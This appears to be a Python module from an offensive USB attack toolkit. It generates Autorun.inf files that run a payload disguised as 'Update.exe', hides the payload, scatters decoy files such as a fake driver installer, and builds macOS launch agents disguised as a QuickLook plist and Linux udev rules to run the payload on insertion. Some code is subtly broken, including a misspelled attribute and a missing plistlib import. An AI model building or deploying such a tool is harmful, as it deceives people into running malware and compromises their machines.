# Auto-Execution Module for USB Insertion
# Implements Windows Autorun.inf functionality for automatic payload execution

import os
import sys
import uuid
from datetime import datetime
from config import (
    DEBUG_MODE, PERSISTENCE_KEY_NAME, PAYLOAD_SCRIPT,
    MITRE_LOGGING_ENABLED, MITRE_TECHNIQUES
)
from core.macos_autorun import MacOSLaunchAgentManager
from core.linux_autorun import LinuxUdevRuleManager

class WindowsAutorunManager:
    """Manages Windows Autorun.inf generation for USB auto-execution"""
    
    def __init__(self):
        self.is_windows = sys.platform == "win32"
        self.autorun_filename = "Autorun.inf"
        self.payload_name = "Update.exe"  # disguised payload name
        
    def generate_autorun_inf(self, payload_path=None, usb_drive=None, 
                             action="Install Drivers", 
                             label="USB Storage",
                             icon_path=None,
                             hide_payload=True):
        """
        Generate a valid Autorun.inf file for Windows auto-execution.
        
        Args:
            payload_path: Path to payload on USB (relative to USB root)
            usb_drive: USB drive root path (optional)
            action: Action string displayed to user
            label: Volume label for the USB
            icon_path: Path to icon file (optional)
            hide_payload: Whether to hide the payload file
            
        Returns:
            str: The generated Autorun.inf content
        """
        payload = payload_path or self.payload_name
        icon = icon_path or ""
        
        autorun_content = f"""[Autorun]
shellexecute={payload}
action={action}
label={label}
icon={icon}
useautoplay=1
"""
        return autorun_content
    
    def generate_autorun_with_shell(self, payload_path=None,
                                    action="Open",
                                    label="USB Storage",
                                    shell_command="open",
                                    hide_payload=True):
        """
        Generate Autorun.inf with shell execute command.
        More reliable for modern Windows systems.
        
        Args:
            payload_path: Path to payload on USB
            action: Action to display
            label: Volume label
            shell_command: Shell command (open, explore, find)
            hide_payload: Hide the payload file
            
        Returns:
            str: The generated Autorun.inf content
        """
        payload = payload_path or self.payload_name
        
        autorun_content = f"""[Autorun]
shellexecute={payload}
action={action}
label={label}
useautoplay=1
"""
        return autorun_content
    
    def generate_autorun_with_run(self, payload_path=None,
                                  action="Start Application",
                                  label="Data Storage",
                                  hide_payload=True):
        """
        Generate Autorun.inf using shell\command\run key.
        Alternative method for better compatibility.
        
        Args:
            payload_path: Path to payload on USB
            action: Action string
            label: Volume label
            hide_payload: Hide payload file
            
        Returns:
            str: The generated Autorun.inf content
        """
        payload = payload_path or self.payload_name
        
        autorun_content = f"""[Autorun]
action={action}
label={label}
shell\\open\\command={payload}
shell\\open=Open
useautoplay=1
"""
        return autorun_content
    
    def create_autorun_inf_file(self, output_path, payload_path=None,
                                 method="shell", hide_payload=True):
        """
        Create the Autorun.inf file on disk.
        
        Args:
            output_path: Path where to save the Autorun.inf file
            payload_path: Path to payload relative to output location
            method: Generation method ('shell', 'run', 'combined')
            hide_payload: Whether to create hidden attribute
            
        Returns:
            bool: True if successful, False otherwise
        """
        try:
            # Generate autorun content based on method
            if method == "run":
                content = self.generate_autorun_with_run(payload_path)
            elif method == "combined":
                content = self.generate_combined_autorun(payload_path)
            else:
                content = self.generate_autorun_with_shell(payload_path)
            
            # Write autorun.inf file
            with open(output_path, 'w') as f:
                f.write(content)
            
            # Set hidden attribute if requested
            if hide_payload:
                self._set_hidden_attribute(output_path)
            
            if DEBUG_MODE:
                print(f"Created Autorun.inf at: {output_path}")
                print(f"Content:\n{content}")
            
            return True
            
        except Exception as e:
            if DEBUG_MODE:
                print(f"Failed to create Autorun.inf: {e}")
            return False
    
    def generate_combined_autorun(self, payload_path=None):
        """
        Generate a comprehensive Autorun.inf with multiple methods.
        Increases chances of execution on different Windows versions.
        
        Args:
            payload_path: Path to payload on USB
            
        Returns:
            str: Combined Autorun.inf content
        """
        payload = payload_path or self.payload_name
        
        autorun_content = f"""[Autorun]
shellexecute={payload}
action=Open with File Explorer
label=USB Storage Device
icon=
useautoplay=1

[Content]
MusicFiles=FALSE
PictureFiles=FALSE
VideoFiles=FALSE
DocFiles=FALSE
"""
        return autorun_content
    
    def create_usb_autorun_package(self, usb_drive_path, payload_file_path,
                                    disguise_name="Update.exe",
                                    create_decoys=True):
        """
        Create a complete USB autorun package with all necessary files.
        
        Args:
            usb_drive_path: Root path of USB drive
            payload_file_path: Path to the payload executable
            disguise_name: Name to disguise payload as
            create_decoys: Whether to create decoy files
            
        Returns:
            dict: Result with success status and details
        """
        result = {
            'success': False,
            'autorun_path': None,
            'payload_path': None,
            'decoy_paths': [],
            'error': None
        }
        
        try:
            # Disguise payload name
            disguised_payload = os.path.join(usb_drive_path, disguise_name)
            
            # Copy payload to USB with disguised name
            import shutil
            shutil.copy2(payload_file_path, disguised_payload)
            result['payload_path'] = disguised_payload
            
            # Set hidden attribute on payload
            self._set_hidden_attribute(disguised_payload)
            
            # Create Autorun.inf
            autorun_path = os.path.join(usb_drive_path, self.autorun_filename)
            self.create_autorun_inf_file(
                autorun_path,
                payload_path=disguise_name,
                method="combined"
            )
            result['autorun_path'] = autorun_path
            
            # Create decoy files if requested
            if create_decoys:
                decoy_paths = self._create_decoy_files(usb_drive_path)
                result['decoy_paths'] = decoy_paths
            
            # Set autorun.inf as hidden
            self._set_hidden_attribute(autorun_path)
            
            result['success'] = True
            
            if DEBUG_MODE:
                print(f"USB autorun package created successfully")
                print(f"Payload: {disguised_payload}")
                print(f"Autorun: {autorun_path}")
            
            return result
            
        except Exception as e:
            result['error'] = str(e)
            if DEBUG_MODE:
                print(f"Failed to create USB autorun package: {e}")
            return result
    
    def _set_hidden_attribute(self, file_path):
        """Set hidden attribute on a file (Windows)"""
        if self.is_windows:
            try:
                import subprocess
                subprocess.run(
                    ['attrib', '+h', file_path],
                    capture_output=True,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
            except Exception:
                pass
    
    def _create_decoy_files(self, usb_drive_path):
        """
        Create believable decoy files on USB.
        
        Args:
            usb_drive_path: USB drive root path
            
        Returns:
            list: Paths to created decoy files
        """
        decoys = []
        
        decoy_files = [
            ('README.txt', 'Please read the instructions before using this USB device.'),
            ('Driver_Install.exe', 'Dummy installer for decoy purposes'),
            ('Setup_Instructions.pdf', 'This is a decoy file.'),
            ('System_Update.log', f'Log file created: {datetime.now().isoformat()}'),
        ]
        
        for filename, content in decoy_files:
            try:
                decoy_path = os.path.join(usb_drive_path, filename)
                with open(decoy_path, 'w') as f:
                    f.write(content)
                decoys.append(decoy_path)
            except Exception:
                pass
        
        return decoys
    
    def validate_autorun_structure(self, autorun_path):
        """
        Validate Autorun.inf file structure.
        
        Args:
            autorun_path: Path to Autorun.inf file
            
        Returns:
            bool: True if valid, False otherwise
        """
        try:
            if not os.path.exists(autorun_path):
                return False
            
            with open(autorun_path, 'r') as f:
                content = f.read()
            
            # Check for required sections
            if '[Autorun]' not in content:
                return False
            
            # Check for execute command
            if 'shellexecute=' not in content and 'shell\\' not in content:
                return False
            
            return True
            
        except Exception:
            return False
    
    def get_autorun_command(self, autorun_path):
       
        try:
            if not os.path.exists(autorun_path):
                return None
            
            with open(autorun_path, 'r') as f:
                content = f.read()
            
            # Look for shellexecute
            for line in content.split('\n'):
                if line.startswith('shellexecute='):
                    return line.split('=', 1)[1].strip()
            
            return None
            
        except Exception:
            return None
    
    def log_technique(self, technique_id, success, details):
        """Log MITRE ATT&CK technique execution"""
        if MITRE_LOGGING_ENABLED and DEBUG_MODE:
            technique_name = MITRE_TECHNIQUES.get(technique_id, 'Unknown')
            status = 'Success' if success else 'Failed'
            print(f"Technique {technique_id} ({technique_name}): {status}")
            if details:
                print(f"Details: {details}")


class USBAutoExecutionManager:
    """Manages cross-platform USB auto-execution"""
    
    def __init__(self):
        self.windows_autorun = WindowsAutorunManager()
        self.macos_autorun = MacOSLaunchAgentManager()
        self.linux_autorun = LinuxUdevRuleManager()
        self.platform = sys.platform
        
    def create_platform_specific_autorun(self, usb_drive_path, payload_path,
                                          platform=None):
        
        platform = platform or self.platform
        
        if platform == "win32":
            return self.windos_autorun.create_usb_autorun_package(
                usb_drive_path, payload_path
            )
        elif platform == "darwin":
            # macOS: Create launch agent plist on the USB drive
            return self._create_macos_autorun(usb_drive_path, payload_path)
        elif platform == "linux":
            # Linux: Create udev rules on the USB drive
            return self._create_linux_autorun(usb_drive_path, payload_path)
        else:
            return {'success': False, 'error': f'Unsupported platform: {platform}'}
    
    def _create_macos_autorun(self, usb_drive_path, payload_path):
        """
        Create macOS autorun configuration on USB drive.
        
        Args:
            usb_drive_path: USB drive root path
            payload_path: Path to payload executable
            
        Returns:
            dict: Result with success status and details
        """
        result = {
            'success': False,
            'plist_path': None,
            'launcher_path': None,
            'error': None
        }
        
        try:
            # Create a launcher script on the USB
            launcher_name = ".launcher"
            launcher_path = os.path.join(usb_drive_path, launcher_name)
            
            launcher_script = f"""#!/bin/bash
cd "$(dirname "$0")"
"{payload_path}"
"""
            
            with open(launcher_path, 'w') as f:
                f.write(launcher_script)
            os.chmod(launcher_path, 0o755)
            result['launcher_path'] = launcher_path
            
            # Generate launch agent plist
            label = f"com.usb.{uuid.uuid4().hex[:8]}"
            plist_content = self.macos_autorun.generate_launch_agent_plist(
                launcher_path, label=label
            )
            
            # Save plist to USB
            plist_name = "com.apple.quicklook.plist"
            plist_path = os.path.join(usb_drive_path, plist_name)
            
            with open(plist_path, 'wb') as f:
                plistlib.dump(plist_content, f)
            
            result['plist_path'] = plist_path
            result['success'] = True
            
            if DEBUG_MODE:
                print(f"macOS autorun created: {plist_path}")
                
            return result
            
        except Exception as e:
            result['error'] = str(e)
            if DEBUG_MODE:
                print(f"Failed to create macOS autorun: {e}")
            return result
    
    def _create_linux_autorun(self, usb_drive_path, payload_path):
        
        result = {
            'success': False,
            'launcher_path': None,
            'udev_rule_path': None,
            'error': None
        }
        
        try:
            # Create a launcher script on the USB
            launcher_name = ".launcher"
            launcher_path = os.path.join(usb_drive_path, launcher_name)
            
            launcher_script = f"""#!/bin/bash
cd "$(dirname "$0")"
"{payload_path}"
"""
            
            with open(launcher_path, 'w') as f:
                f.write(launcher_script)
            os.chmod(launcher_path, 0o755)
            result['launcher_path'] = launcher_path
            
            # Generate udev rule
            rule_content = self.linux_autorun.generate_udev_rule(
                launcher_path,
                rule_name="99-usb-payload"
            )
            
            # Save udev rule to USB
            rule_name = "99-usb-payload.rules"
            rule_path = os.path.join(usb_drive_path, rule_name)
            
            with open(rule_path, 'w') as f:
                f.write(rule_content)
            
            result['udev_rule_path'] = rule_path
            result['success'] = True
            
            if DEBUG_MODE:
                print(f"Linux autorun created: {rule_path}")
                
            return result
            
        except Exception as e:
            result['error'] = str(e)
            if DEBUG_MODE:
                print(f"Failed to create Linux autorun: {e}")
            return result


# Global instances
windows_autorun_manager = WindowsAutorunManager()
usb_auto_execution_manager = USBAutoExecutionManager()
